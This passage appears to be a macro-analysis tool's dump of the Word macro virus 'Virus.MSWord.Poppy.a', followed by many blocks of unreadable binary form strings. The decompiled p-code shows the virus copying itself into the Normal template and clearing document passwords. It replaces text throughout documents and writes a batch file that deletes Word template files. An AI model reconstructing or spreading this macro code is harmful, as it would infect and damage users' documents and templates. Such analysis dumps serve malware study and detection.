' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #146:
' Line #147:
' 	EndIfBlock 
' Line #148:
' Line #149:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #150:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #151:
' 	LitStr 0x0000 ""
' 	MemStWith Password 
' Line #152:
' 	LitStr 0x0000 ""
' 	MemStWith WritePassword 
' Line #153:
' 	EndWith 
' Line #154:
' Line #155:
' 	GoTo fuckoff 
' Line #156:
' Line #157:
' 	Label Hell 
' Line #158:
' Line #159:
' 	Label fuckoff 
' Line #160:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #161:
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub BleePay())
' Line #164:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #165:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #166:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #167:
' 	LitStr 0x0002 "he"
' 	MemStWith Then 
' Line #168:
' 	LitStr 0x0017 " ** The Mighty Blee ** "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #169:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #170:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #171:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #172:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #173:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #174:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #175:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #176:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #177:
' 	EndWith 
' Line #178:
' Line #179:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #180:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #181:
' Line #182:
' 	EndSub 
' Line #183:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #184:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #185:
' Line #186:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #187:
' 	LitStr 0x0009 "@echo off"
' 	St Part1$ 
' Line #188:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #189:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #190:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #191:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #192:
' 	LitStr 0x0003 "cls"
' 	St Part33$ 
' Line #193:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St Part333$ 
' Line #194:
' Line #195:
' 	Ld Friend 
' 	St hFile 
' Line #196:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #200:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld Part333$ 
' 	Add 
' 	PrintItemNL 
' Line #204:
' 	Ld hFile 
' 	Close 0x0001 
' Line #205:
' Line #206:
' 	GoTo Hell 
' Line #207:
' Line #208:
' 	Label Hell 
' Line #209:
' Line #210:
' 	EndSub 
' Line #211:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	





-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	


��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


















































��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"Qa	2q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��3R��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$b��4Cr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"Qaq2������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3$C%R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]U�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�랽��8��z�}���*�ܲ��2=A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@=	MKM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�"O�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?��:��W�驼��Gp�;c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ӏ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VF견���En�o6���>PV]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�q펁.�(�#S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ΦI��O�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�<��^%ҙn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jfVB�-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
蜮�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/� }q�}��{��i�)��P�	@ʡNҫ�>����8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$n8�3���=UxZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m1��$��\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Jƞd��q�ݩ�m�A�c8��O

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lw
ju�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cߌ|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~�E��KQp���_�xѱ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�z�ε
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�����	©W漲�A��xYD2�DY�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c��ۮSJ�yr��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{)��U�RE*N���:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�t�h�@*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7��0>�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YU��V��D��
�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Й
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�n��7c�8���*�Cn��Xb�]�¾
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ތ}Ƿ�/[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P*K�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������<�s�u�t:�O	"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��A-C������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GcR�~�p�vM:m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RAY�Q��$��Q�����(Sv�L�3G��8�;��*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�8��H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�Z�N��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̤�7�0�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�׈j���1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I�᨞V�v�?v����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��Hs"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&ˑ3]@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߴ��ۧUbH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�άY�p�N0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pKr�e��5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n0>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��Ե5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
˔�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=|&:yD�C�ug$�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(��Z�����R�);�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Qgk�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.���8�O�/:���K]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QPS�C,�JX�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xt�{}vӳ�[��E5����&܎��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,rc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���O^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,���u7;���I}�?d�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��Y�%dc�fQ����E�Z9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڪ�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#Qd�����WQ����A#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>]���\m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dC�@͝��-��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����1$ONC,�����q�z�~!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OI�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I{�K0u���GMq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F|��.q��N�CmtQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ts���:�K��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1��³���㼕PIm��?p*Vj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-�M���9�n۸�*�;���ZO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{���_Oo��m��ke��L߳,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��Lļ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_�ٟs�n�>c��z7ISWIE=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�U(L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ix��6�y��ŃÍp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>�g��[3�UܥZ|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V*s����_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i�\�+����w��=�v��V\����G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�TS�5T�����ۀ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�s�1'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&���MZb/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tjj�aD_����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�s��7�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�姵�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#<����?�:�M"E�9f@	��A��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�Dh�d��GDB@��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3������V��W.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�u11�	q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d����,u6Z
-------------------------------------------------------------------------------
